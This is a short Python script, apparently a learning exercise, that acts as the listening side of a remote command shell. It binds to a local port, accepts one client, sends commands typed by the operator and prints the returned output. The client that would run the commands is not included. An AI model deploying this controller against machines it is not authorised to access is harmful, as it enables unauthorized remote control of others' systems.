#!/usr/bin/env python3  # Fixing the shebang for Python 3 compatibility.

# Server script to accept client connections and execute commands.

# Import necessary libraries.
import socket  # For creating socket connections.

# Create a socket connection using IPv4 (AF_INET) and TCP (SOCK_STREAM).
Connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Remove kernel's sleep mode for the socket, allowing quick reuse of the port.
Connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Bind the server to an IP address and port.
Connection.bind(("127.0.0.1", 8080))

# Start listening for incoming connections.
print("[+] Listening...")
Connection.listen(1)

# Accept an incoming connection.
Client, address = Connection.accept()

# Print a message indicating successful connection.
print(f"[+] Accepted connection from {address}.")

# Command-execution loop.
while True:
    # Input shell command from the server's console.
    KernalInput = input(">> ")
    
    # If the input is "exit" (case insensitive), break the loop and close connections.
    if KernalInput.lower() == "exit":
        break

    # Send the command to the connected client.
    Client.send(KernalInput.encode())
    
    # Receive and decode the client's output.
    ClientOutput = Client.recv(1024).decode()
    
    # Print the client's output.
    print(ClientOutput)

# Close the client and server connections.
Client.close()
Connection.close()
